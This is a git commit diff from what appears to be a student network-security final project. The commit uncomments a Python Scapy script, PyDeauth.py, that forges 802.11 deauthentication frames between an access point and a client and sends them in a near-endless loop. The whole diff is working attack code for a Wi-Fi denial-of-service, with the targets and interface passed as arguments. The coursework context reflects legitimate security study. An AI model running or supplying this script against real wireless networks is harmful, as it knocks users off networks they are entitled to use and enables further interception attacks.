5b02ee7e08ca97914c0344654f3a7d10baf3ded8
ckpalmer <43018470+ckpalmer@users.noreply.github.com>
2020-04-24 01:40:06 -0400

    Uncommented things

--- School/NetSecurity/FinalProject/PyDeauth.py
+++ School/NetSecurity/FinalProject/PyDeauth.py
@@ -1,4 +1,4 @@
-#from scapy.all import *
+from scapy.all import *
 import sys
 
 
@@ -13,12 +13,12 @@ client = sys.argv[2]
 interface = sys.argv[3]
 
 print("Creating packet to send to Access point\n")
-#pkt= RadioTap()/Dot11(addr1=client,addr2=ap,addr3=ap)/Dot11Deauth()
+pkt= RadioTap()/Dot11(addr1=client,addr2=ap,addr3=ap)/Dot11Deauth()
 print("Creating packet to send to Client\n")
-#pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
 
-#for i in range (1000000000):
-    #sendp(pkt,iface=interface)
+for i in range (1000000000):
+    sendp(pkt,iface=interface)
     print("Sent packet to Access point\n")
-    #sendp(pkt1, iface=interface)
+    sendp(pkt1, iface=interface)
     print("Sent packet to Client\n")
